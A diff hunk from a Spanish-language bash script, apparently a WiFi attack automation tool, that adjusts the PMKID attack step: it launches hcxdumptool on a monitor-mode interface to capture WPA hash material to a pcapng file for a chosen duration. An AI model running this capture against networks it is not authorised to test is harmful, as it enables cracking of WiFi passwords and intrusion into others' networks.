@@ -123,7 +123,9 @@ if [ $airtest -eq 0 ] && [ $xtermtest -eq 0 ] && [ $macctest -eq 0 ]; then
 								2)
 								echo -e "\n${greenColour}[*] Iniciando ataque PKMID..\n"
 								sleep 1 
-								read -p "[?] Cuantos segundos quieres que dure la captura de los paquetes?: " seg
+								echo -e "${blueColour}[!] Recomendacion: 600 segundos (10 minutos)"
+								read -p "[?] Cuantos segundos quieres que dure la captura de los paquetes?:" seg
+								$cleancolor
 								xterm -hold -e "hcxdumptool -i ${tar}mon -o HashPKMID.pcapng --active_beacon --enable_status=15" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
 								hcxcaptool_PID=$!
 								sleep ${seg}; kill -9 $hcxcaptool_PID; wait $hcxcaptool_PID 2>/dev/null
